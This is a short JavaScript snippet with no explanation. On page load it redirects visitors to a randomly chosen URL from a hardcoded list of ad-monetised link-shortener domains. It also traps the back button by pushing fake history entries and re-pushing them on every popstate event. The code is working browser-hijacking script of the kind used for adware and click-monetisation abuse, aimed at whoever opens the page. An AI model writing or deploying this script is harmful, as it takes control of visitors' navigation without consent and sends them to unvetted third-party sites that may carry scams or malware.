var urls = ["https://besargaji.com/SHPa5e",
            "https://link.bicolink.net/rhGdbExuB",
            "https://arahlink.id/hORf",
            "https://ouo.io/y76U8e",
            "https://adbull.me/VZsZ0TO",
            "https://to.aoutoqw.xyz/jLnfvA",
            "https://go.aoutoqw.xyz/57Ss"];

function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

